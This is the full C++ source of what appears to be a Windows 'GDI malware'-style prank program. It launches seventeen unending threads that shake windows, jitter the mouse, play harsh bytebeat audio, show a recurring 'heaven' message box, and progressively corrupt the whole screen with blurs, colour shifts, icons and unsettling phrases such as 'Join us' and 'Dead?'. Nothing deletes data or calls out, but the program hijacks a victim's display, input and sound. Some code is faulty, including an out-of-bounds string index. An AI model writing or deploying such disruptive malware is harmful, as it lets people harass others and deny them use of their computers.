#include <windows.h>
#include <iostream>
#include <time.h>
#include <math.h>
#include <vector>
#include <cmath>
#include <chrono>
#include <string>
#include <thread>

//DEPEDENCIES OF WAVIA
#include <cstdlib>
#include <ctime>
#include <random>

#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "winmm.lib")

#pragma warning(disable : 4996)

//DEPEDENCIES OF SPHERE
struct Point3D { float x, y, z; };
#define NUM_POINTS 600
#define SPHERE_RADIUS 130.0f
#define PI 3.14159265359f

COLORREF GetRainbowColor(float h) {
	float r, g, b;
	h = fmodf(h, 1.0f);
	int i = (int)(h * 6);
	float f = h * 6 - i;
	float q = 1 - f;
	switch (i % 6) {
	case 0: r = 1, g = f, b = 0; break;
	case 1: r = q, g = 1, b = 0; break;
	case 2: r = 0, g = 1, b = f; break;
	case 3: r = 0, g = q, b = 1; break;
	case 4: r = f, g = 0, b = 1; break;
	case 5: r = 1, g = 0, b = q; break;
	}
	return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

struct WindowState {
	HWND hwnd;
	int originalX, originalY;
	float offset;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
		std::vector<HWND>* windows = (std::vector<HWND>*)lParam;
		windows->push_back(hwnd);
	}
	return TRUE;
}

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;

namespace Colors
{
	RGBQUAD HSVtoRGB(HSV hsv)
	{
		int hi = (int)floor(hsv.h / 60.0) % 6;
		double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
		double p = hsv.v * (1.0 - hsv.s);
		double q = hsv.v * (1.0 - f * hsv.s);
		double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);

		switch (hi)
		{
		case 0:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
		case 1:
			return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
		case 2:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
		case 3:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
		case 4:
			return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
		default:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
		}
	}

	HSV RGBtoHSV(RGBQUAD rgbquad)
	{
		HSV hsv;

		double rd = rgbquad.rgbRed / 255.0;
		double gd = rgbquad.rgbGreen / 255.0;
		double bd = rgbquad.rgbBlue / 255.0;

		double cmax = max(max(rd, gd), bd);
		double cmin = min(min(rd, gd), bd);
		double delta = cmax - cmin;

		hsv.v = cmax;

		if (cmax > 0.0)
			hsv.s = delta / cmax;
		else
			hsv.s = 0.0;

		if (delta > 0.0)
		{
			if (cmax == rd)
				hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
			else if (cmax == gd)
				hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
			else if (cmax == bd)
				hsv.h = 60.0 * ((rd - gd) / delta + 4.0);

			if (hsv.h < 0.0)
				hsv.h += 360.0;
		}
		else
		{
			hsv.h = 0.0;
		}

		return hsv;
	}
}


//SYSTEM PAYLOADS
DWORD WINAPI PAYLOAD1(LPVOID lpParam)
{
	std::vector<HWND> windowHandles;
	float timer = 0;

	while (true) {
		windowHandles.clear();
		EnumWindows(EnumWindowsProc, (LPARAM)&windowHandles);

		for (HWND hwnd : windowHandles) {
			RECT rect;
			GetWindowRect(hwnd, &rect);

			int jump = (int)(sin(timer + (UINT_PTR)hwnd) * 10);

			SetWindowPos(hwnd, NULL, rect.left, rect.top + jump, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
		}

		timer += 0.5f;
		Sleep(30);
	}

	return 0;
}

DWORD WINAPI PAYLOAD2(LPVOID lParam)
{
	Sleep(20000);
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 4 - 1;
		int Y = cursor.y + rand() % 4 - 1;
		SetCursorPos(X, Y);
		//BlockInput(true);
		//Sleep(10);
	}
	return(1);

}

DWORD WINAPI PAYLOAD3(LPVOID lpvd)
{
	while (true)
	{
		//1 min
		Sleep(100 * 60);

		MessageBoxW(NULL, L"location: heaven\n\ncontact:", L"running seraphim.seraphim", MB_OK | MB_ICONASTERISK);
	}

	return 0x00;
}

//BYTEBEATS

//GLITCH
DWORD WINAPI BYTEBEAT1(LPVOID lpvd) {
	Sleep(5000);
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 17000 * 60;
	BYTE* sbuffer = new BYTE[bufferSize];
	DWORD t = 0;

	while (true) {
		for (int i = 0; i < bufferSize; i++, t++) {
			sbuffer[i] = (BYTE)(t * ((t >> 1 | t >> 100) & 80 & t >> 1));
		}
		WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
		waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
		Sleep(30000);
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	}
	return 0;
}

//BLOCKY
DWORD WINAPI BYTEBEAT2(LPVOID lpvd)
{
	Sleep(80000);
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const int bufferSize = 17000 * 60;
	BYTE* sbuffer = new BYTE[bufferSize];
	DWORD t = 0;

	while (true) {
		for (int i = 0; i < bufferSize; i++, t++) {
			sbuffer[i] = (BYTE)(t * ((t >> 32 | t >> 8) & 90 & t >> 40));
		}
		WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
		waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
		Sleep(30000);
		waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	}
	return 0;
}

//GDI PAYLOADS

//JPEG COMPRESSION
DWORD WINAPI GDIPAYLOAD1(LPVOID lpParam) {
	Sleep(5000);
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 8;
	int hs = h / 8;

	BLENDFUNCTION blur = { 0 };
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	//SET OUT BLUR
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 20;

	INT i = 0;

	while (1)
	{
		StretchBlt(dcCopy, rand() % 1, rand() % 1, ws, hs, dc, rand() % -1, rand() % -1, w, h, SRCCOPY);

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				rgbquad[index].rgbRed += i;
				rgbquad[index].rgbGreen += i;
				rgbquad[index].rgbBlue += i;
			}
		}

		i++;

		Sleep(rand() % 500);
		AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, blur);
	}

	return 0x00;
}

//HSV ELIPSES
DWORD WINAPI GDIPAYLOAD2(LPVOID lpParam) {
	Sleep(20000);
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(dcCopy, bmp);

	INT i = 0;

	FLOAT a = 5.0;
	FLOAT b = 3.0;

	SetStretchBltMode(dc, COLORONCOLOR);
	SetStretchBltMode(dcCopy, COLORONCOLOR);

	while (1)
	{
		StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

		int randx = rand() % ws;
		int randy = rand() % hs;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = x - randx;
				int cy = y - randy;

				//(x²/a²) + (y²+b²) = 1
				int zx = (cx * cx) / (a * a);
				int zy = (cy * cy) / (b * b);

				int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

				HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

				hsv.h = fmod(fx + i, 360.0);

				rgbquad[index] = Colors::HSVtoRGB(hsv);
			}
		}

		i++;

		StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

		Sleep(rand() % 1000);
	}

	return 0x00;
}

//WAVES
DWORD WINAPI GDIPAYLOAD3(LPVOID lpParam) {
	Sleep(40000);
	srand(static_cast<unsigned int>(time(0)));
	HDC desk;
	int x, t, sw, sh;
	while (true) {
		desk = GetDC(0);
		sw = GetSystemMetrics(SM_CXSCREEN);
		sh = GetSystemMetrics(SM_CYSCREEN);
		t = (rand() % sh);
		x = (rand() % 5);
		if (x == 0) {
			StretchBlt(desk, 2, t, sw + 4, t, desk, 0, t, sw, t, SRCCOPY);
		}
		else if (x == 1) {
			StretchBlt(desk, 0, t, sw, t, desk, 2, t, sw + 4, t, SRCCOPY);
		};
	};

	return 0;
}

//SHPERE
DWORD WINAPI GDIPAYLOAD4(LPVOID lpParam) {
	Sleep(60000);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	std::vector<Point3D> points;
	for (int i = 0; i < NUM_POINTS; i++) {
		float phi = acosf(-1.0f + (2.0f * i) / NUM_POINTS);
		float theta = sqrtf(NUM_POINTS * PI) * phi;
		points.push_back({ cosf(theta) * sinf(phi), sinf(theta) * sinf(phi), cosf(phi) });
	}

	float posX = (float)(rand() % (sw - 300) + 150);
	float posY = (float)(rand() % (sh - 300) + 150);
	float velX = 6.0f;
	float velY = 4.0f;

	float rotX = 0, rotY = 0, hue = 0;

	while (true) {
		HDC hdc = GetDC(NULL);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, hbm);

		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

		posX += velX; posY += velY;
		if (posX - SPHERE_RADIUS <= 0 || posX + SPHERE_RADIUS >= sw) velX *= -1;
		if (posY - SPHERE_RADIUS <= 0 || posY + SPHERE_RADIUS >= sh) velY *= -1;

		rotX += 0.03f; rotY += 0.02f; hue += 0.005f;

		for (int i = 0; i < NUM_POINTS; i++) {
			float x = points[i].x * SPHERE_RADIUS;
			float y = points[i].y * SPHERE_RADIUS;
			float z = points[i].z * SPHERE_RADIUS;

			float ty = y * cosf(rotX) - z * sinf(rotX);
			float tz = y * sinf(rotX) + z * cosf(rotX);
			y = ty; z = tz;

			float tx = x * cosf(rotY) + z * sinf(rotY);
			tz = -x * sinf(rotY) + z * cosf(rotY);
			x = tx; z = tz;

			int screenX = (int)(x + posX);
			int screenY = (int)(y + posY);

			int pSize = (int)((z + SPHERE_RADIUS) / (SPHERE_RADIUS * 2) * 6) + 2;

			if (z > -SPHERE_RADIUS * 0.7) {
				HBRUSH brush = CreateSolidBrush(GetRainbowColor(hue + (float)i / NUM_POINTS));
				SelectObject(hdcMem, brush);

				Ellipse(hdcMem, screenX - pSize, screenY - pSize, screenX + pSize, screenY + pSize);

				DeleteObject(brush);
			}
		}

		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);

		DeleteObject(hbm);
		DeleteDC(hdcMem);
		ReleaseDC(NULL, hdc);

		Sleep(10);
	}
	return 0;
}

//RANDOM BITBLT
DWORD WINAPI GDIPAYLOAD5(LPVOID lpParam) {
	Sleep(80000);
	while (1) {
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
		Sleep(10);
		ReleaseDC(0, hdc);
	}

	return 0x00;
}

//SHAKE
DWORD WINAPI GDIPAYLOAD6(LPVOID lpParam)
{
	Sleep(80000);
	while (1) {
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 12, rand() % 12, w, h, hdc, rand() % 12, rand() % 12, SRCCOPY);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

//TRAIN
DWORD WINAPI GDIPAYLOAD7(LPVOID lpParam)
{
	Sleep(100000);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, -10, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, w - 10, 0, w, h, hdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}

	return 0x00;
}

//ICONS
DWORD WINAPI GDIPAYLOAD8(LPVOID lpParam)
{
	Sleep(120000);
	HDC hDc = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_ERROR));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_QUESTION));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_WARNING));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_ASTERISK));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_APPLICATION));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_SHIELD));
		Sleep(100);
	}
}

//RGB SHIFT
DWORD WINAPI GDIPAYLOAD9(LPVOID lpParam)
{
	Sleep(140000);
	while (1) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, bm);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		POINT pt[3];
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
		DeleteObject(brush);
		DeleteObject(hdcMem); DeleteObject(bm);
		ReleaseDC(0, hdc);
		Sleep(1);
	}

	return 0x00;
}

//TEXTS
DWORD WINAPI GDIPAYLOAD10(LPVOID lpParam)
{
	Sleep(160000);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	const char* lpStrings[] = {
		"Aether", "happy", "Come at us please", "Welcome to heaven", "Angels",
		"Everyday is a paradise", "Everybody is here", "come with us", "we are waiting for you",
		"Lights", "Is very high here", "Welcome :)", "Open the door inside your heart",
		"Doors opened to you", "We are here for you", "don't be scared", "Don't worry, we are here",
		"Follow the echoes of eternity", "Immortality?", "Im you, you are me", "Brightness", "Join us",
		"We wish you go with us", "Unknown", "Dead?", "Alive?", "Hello user"
	};

	int stringCount = sizeof(lpStrings) / sizeof(lpStrings[0]);

	while (true) {
		HDC hdc = GetDC(NULL);

		LOGFONT lFont = { 0 };
		lFont.lfWidth = 20;
		lFont.lfHeight = 50;
		lFont.lfOrientation = rand() % 3600;
		lFont.lfEscapement = lFont.lfOrientation;
		lFont.lfWeight = 800;
		lFont.lfUnderline = TRUE;
		lFont.lfQuality = DRAFT_QUALITY;
		lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;
		lstrcpy(lFont.lfFaceName, L"Arial");

		HFONT hFont = CreateFontIndirect(&lFont);
		SelectObject(hdc, hFont);

		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkMode(hdc, TRANSPARENT);

		if (rand() % 25 == 24) {
			int x = rand() % w;
			int y = rand() % h;
			const char* selectedText = lpStrings[rand() % stringCount];

			TextOutA(hdc, x, y, selectedText, strlen(selectedText));
		}

		DeleteObject(hFont);
		ReleaseDC(NULL, hdc);

		Sleep(10);
	}

	return 0;
}

//TEXTS AND BITBLT
DWORD WINAPI GDIPAYLOAD11(LPVOID lpParam)
{
	Sleep(180000);
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);

	LOGFONTW lFont = { 0 };

	lFont.lfWidth = 20;
	lFont.lfHeight = 50;
	lFont.lfOrientation = 400;
	lFont.lfWeight = 800;
	lFont.lfUnderline = TRUE;
	lFont.lfQuality = DRAFT_QUALITY;
	lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

	lstrcpy(lFont.lfFaceName, L"Arial Black");

	while (true)
	{
		if (rand() % 25 == 24)
		{
			LPCSTR lpStrings[] =
			{
				"Aether", "happy", "Come at us please", "Welcome to heaven", "Angels",
				"Everyday is a paradise", "Everybody is here", "come with us", "we are waiting for you",
				"Lights", "Is very high here", "Welcome :)", "Open the door inside your heart",
				"Doors opened to you", "We are here for you", "don't be scared", "Don't worry, we are here",
				"Follow the echoes of eternity", "Immortality?", "Im you, you are me", "Brightness", "Join us",
				"We wish you go with us", "Unknown", "Dead?", "Alive?", "Hello user"
			};

			lFont.lfEscapement = rand() % 60;

			HFONT hFont = CreateFontIndirectW(&lFont);
			SelectObject(dc, hFont);

			SetTextColor(dc, RGB(rand() % 0xFF, rand() % 0xFF, rand() % 0xFF));
			SetBkColor(dc, RGB(rand() % 0xA0, rand() % 0xA0, rand() % 0xA0));

			int index = rand() % 40;

			TextOutA(dc, rand() % w, rand() % h, lpStrings[index], lstrlenA(lpStrings[index]));

			if (rand() % 25 == 24)
			{
				if (rand() % 2 == 0)
				{
					BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x999999);
				}
				else
				{
					BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x666666);
				}
			}

			Sleep(rand() % 5);
		}
	}

	return 0x00;
}

//RADIAL BLUR
DWORD WINAPI GDIPAYLOAD12(LPVOID lpParam)
{
	Sleep(200000);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, 1);

	POINT lppoint[3];

	while (true) {
		HDC hdc = GetDC(nullptr);
		HDC mhdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		HGDIOBJ holdbit = SelectObject(mhdc, hbit);

		if (dis(gen) == 1) {
			lppoint[0] = { 0 + 30, 0 - 30 };
			lppoint[1] = { w + 30, 0 + 30 };
			lppoint[2] = { 0 - 30, h - 30 };
		}
		else {
			lppoint[0] = { 0 - 30, 0 + 30 };
			lppoint[1] = { w - 30, 0 - 30 };
			lppoint[2] = { 0 + 30, h + 30 };
		}

		PlgBlt(mhdc, lppoint, hdc, 0, 0, w, h, nullptr, 0, 0);

		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 60, 0 };
		AlphaBlend(hdc, 0, 0, w, h, mhdc, 0, 0, w, h, blend);

		SelectObject(mhdc, holdbit);
		DeleteObject(hbit);
		DeleteDC(mhdc);
		ReleaseDC(nullptr, hdc);

	}

	return 0x00;
}

int main() {
	srand(time(NULL));
	CreateThread(NULL, 0, PAYLOAD1, NULL, 0, NULL);
	CreateThread(NULL, 0, BYTEBEAT1, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD1, NULL, 0, NULL);
	CreateThread(NULL, 0, PAYLOAD2, NULL, 0, NULL);
	CreateThread(NULL, 0, PAYLOAD3, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD2, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD3, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD4, NULL, 0, NULL);
	CreateThread(NULL, 0, BYTEBEAT2, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD5, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD6, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD7, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD8, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD9, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD10, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD11, NULL, 0, NULL);
	CreateThread(NULL, 0, GDIPAYLOAD12, NULL, 0, NULL);

	while (1) Sleep(1000);
	return 0;
}